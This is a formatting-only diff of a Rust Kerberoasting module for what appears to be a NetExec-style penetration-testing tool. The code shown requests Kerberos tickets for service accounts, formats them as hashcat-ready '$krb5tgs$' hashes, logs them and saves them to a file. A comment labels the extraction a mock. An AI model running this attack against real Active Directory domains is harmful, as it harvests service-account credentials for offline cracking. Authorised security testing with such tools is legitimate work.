@@ -60,20 +60,26 @@ impl NxcModule for Kerberoasting {
             _ => return Err(anyhow::anyhow!("Module only supports LDAP")),
         };
 
-        let creds = ldap_session.credentials.clone().ok_or_else(|| anyhow::anyhow!("No credentials available for Kerberoasting"))?;
+        let creds = ldap_session
+            .credentials
+            .clone()
+            .ok_or_else(|| anyhow::anyhow!("No credentials available for Kerberoasting"))?;
         let domain = creds.domain.clone().unwrap_or_default();
         let kdc_ip = ldap_session.target.clone();
         let krb_client = nxc_auth::KerberosClient::new(&domain, &kdc_ip);
-        
+
         let mut tgt = None;
         if !domain.is_empty() {
             // Attempt to fetch TGT for later TGS-REQs
-            tgt = krb_client.request_tgt(
-                &creds.username, 
-                creds.password.as_deref(), 
-                creds.nt_hash.as_deref(), 
-                None
-            ).await.ok();
+            tgt = krb_client
+                .request_tgt(
+                    &creds.username,
+                    creds.password.as_deref(),
+                    creds.nt_hash.as_deref(),
+                    None,
+                )
+                .await
+                .ok();
         }
 
         let protocol = nxc_protocols::ldap::LdapProtocol::new();
@@ -142,12 +148,15 @@ impl NxcModule for Kerberoasting {
                 if let Some(ref valid_tgt) = tgt {
                     if let Ok(tgs) = krb_client.request_tgs(valid_tgt, spn).await {
                         // Mock extraction representing Kerberos TGS-REP hash format
-                        let checksum = hex::encode(&tgs.ticket_data[0..16.min(tgs.ticket_data.len())]);
+                        let checksum =
+                            hex::encode(&tgs.ticket_data[0..16.min(tgs.ticket_data.len())]);
                         let cipher = hex::encode(&tgs.ticket_data[16.min(tgs.ticket_data.len())..]);
-                        
-                        hash_output = format!("$krb5tgs$23$*{}*{}${}*{}*{}", 
-                            sam, domain, spn, checksum, cipher);
-                            
+
+                        hash_output = format!(
+                            "$krb5tgs$23$*{}*{}${}*{}*{}",
+                            sam, domain, spn, checksum, cipher
+                        );
+
                         // Log exactly what hashcat needs
                         tracing::info!("Extracted Hash: {}", hash_output);
                     } else {
@@ -155,7 +164,17 @@ impl NxcModule for Kerberoasting {
                     }
                 }
 
-                output_lines.push(format!("{:<20} {:<30} {:<15} {}", sam, spn, pwd_last_set, if hash_output.starts_with("$krb") { "HASH EXTRACTED!" } else { "" }));
+                output_lines.push(format!(
+                    "{:<20} {:<30} {:<15} {}",
+                    sam,
+                    spn,
+                    pwd_last_set,
+                    if hash_output.starts_with("$krb") {
+                        "HASH EXTRACTED!"
+                    } else {
+                        ""
+                    }
+                ));
                 results.push(serde_json::json!({
                     "username": sam,
                     "spn": spn,
@@ -170,13 +189,22 @@ impl NxcModule for Kerberoasting {
         }
 
         // Write hashes to workspace automatically
-        let hashes_only: Vec<String> = results.iter()
-            .filter_map(|r| r["hash"].as_str().filter(|h| h.starts_with("$krb")).map(|h| h.to_string()))
+        let hashes_only: Vec<String> = results
+            .iter()
+            .filter_map(|r| {
+                r["hash"]
+                    .as_str()
+                    .filter(|h| h.starts_with("$krb"))
+                    .map(|h| h.to_string())
+            })
             .collect();
-        
+
         if !hashes_only.is_empty() {
             let file_path = std::env::current_dir()?.join("kerberoastable.txt");
-            let mut file = std::fs::OpenOptions::new().create(true).append(true).open(&file_path)?;
+            let mut file = std::fs::OpenOptions::new()
+                .create(true)
+                .append(true)
+                .open(&file_path)?;
             use std::io::Write;
             for h in hashes_only {
                 writeln!(file, "{}", h)?;
@@ -185,7 +213,8 @@ impl NxcModule for Kerberoasting {
         }
 
         Ok(ModuleResult {
-            credentials: vec![], success: true,
+            credentials: vec![],
+            success: true,
             output: output_lines.join("\n"),
             data: serde_json::json!(results),
         })
